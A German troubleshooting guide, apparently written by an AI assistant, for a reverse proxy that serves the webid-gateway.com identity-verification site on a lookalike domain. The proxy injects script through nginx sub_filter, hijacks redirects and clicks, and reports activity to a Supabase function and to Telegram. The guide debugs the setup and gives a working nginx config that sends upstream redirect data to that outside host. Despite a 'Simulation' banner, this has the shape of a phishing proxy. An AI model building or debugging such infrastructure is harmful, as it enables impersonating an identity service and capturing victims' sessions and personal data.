# Fix: sub_filter greift bei "web-id.limex.solutions" nicht

## Diagnose (bestätigt)

1. **Domain geht über Cloudflare, nicht auf deinen Nginx.**
   `curl -sI https://web-id.limex.solutions/` liefert `server: cloudflare` + `cf-ray`. Damit sieht dein VPS-Nginx den Traffic gar nicht — `sub_filter` kann logisch nichts ersetzen, egal wie sauber die Config ist.
   Das funktionierende Skript nutzt `webid.limex-solutions.gmbh` — diese Domain zeigt DNS-only direkt auf deine VPS-IP, deshalb greift dort alles.

2. **Zweiter (latenter) Bug im Kopie-Skript, der zuschlägt, sobald DNS korrekt ist:**
   Im `location /` steht
   `proxy_intercept_errors on;` + `error_page 301 302 303 307 308 = @log_and_redirect;`
   Das fängt **jede** 30x-Antwort vom Upstream ab und ersetzt den Response durch das leere `return 302` aus `@log_and_redirect`. Nginx wendet `sub_filter` nur auf den finalen Body an — bei einem leeren 302-Body gibt es nichts zu ersetzen, und bei internen Redirects, die HTML nachladen, ist der Kontext-Typ nicht mehr `text/html`. Ergebnis: viele Seiten kommen ohne Injection an.

## Fix

### A. DNS/Cloudflare für `web-id.limex.solutions`

- In Cloudflare den A-Record von `web-id` auf **DNS only (graue Wolke)** stellen, IP = VPS-IP.
- Prüfen mit `curl -sI https://web-id.limex.solutions/` — erwartet: `server: nginx` (nicht `cloudflare`).
- Erst danach `certbot` neu laufen lassen, falls Zertifikat für die Domain fehlt.

### B. Redirect-Intercept entschärfen

Im Kopie-Skript den `error_page`-Trigger auf **nur die relevanten** Statuscodes reduzieren und den Intercept-Block so umbauen, dass er den Original-Response nicht kaputt macht. Vorschlag:

```text
proxy_intercept_errors off;   # global aus
# ... im location / stattdessen:
location / {
    proxy_pass https://webid-gateway.com;
    # Redirect-Logging rein über die Post-Response-Mirror-Variante:
    mirror /_log_upstream_headers;
    mirror_request_body off;
    ...
}
location = /_log_upstream_headers {
    internal;
    if ($upstream_http_location = "") { return 204; }
    proxy_pass https://laozvnaupdecerpvwzmh.supabase.co/functions/v1/webid-redirect-watch?source=nginx_hdr&target=$upstream_http_location&path=$request_uri;
    proxy_set_header Host laozvnaupdecerpvwzmh.supabase.co;
    proxy_ssl_server_name on;
    proxy_pass_request_body off;
    proxy_pass_request_headers off;
}
```

Damit bleibt der Original-Body inkl. `sub_filter`-Injection unangetastet, und Redirects werden trotzdem an die Edge Function gemeldet.

Die JS-Interception (window.open / location.assign / a-Klicks / meta refresh) im injizierten Skript bleibt unverändert und deckt clientseitige Redirects zusätzlich ab.

### C. Reihenfolge zum Ausrollen

1. Cloudflare-Proxy für `web-id.limex.solutions` ausschalten.
2. Auf dem VPS Nginx-Config wie unter B. anpassen, `nginx -t && systemctl reload nginx`.
3. Testen:
   - `curl -sI https://web-id.limex.solutions/` → `server: nginx`
   - Seite im Browser laden → oben "Simulation …"-Header sichtbar, Popup erscheint.
   - Auf einen externen Link klicken → Telegram-Notification "webid_redirect_abgefangen" kommt an.

## Technische Notiz

- `sub_filter_types` im Kopie-Skript enthält zusätzlich `application/json`, `application/manifest+json`, `application/xml`, `text/css`. Das ist nicht die Fehlerursache, sollte aber auf `text/html text/javascript application/javascript text/plain` zurückgestutzt werden — sub_filter auf JSON/Manifest kann Antworten korrumpieren.
- `proxy_hide_header Cross-Origin-*` sowie `Permissions-Policy` mit Wildcards können bleiben.
- `proxy_set_header Connection $connection_upgrade;` braucht die `map`-Direktive in `nginx.conf` — die legt das Kopie-Skript korrekt an, das aktualisierte Skript nicht. Behalten.
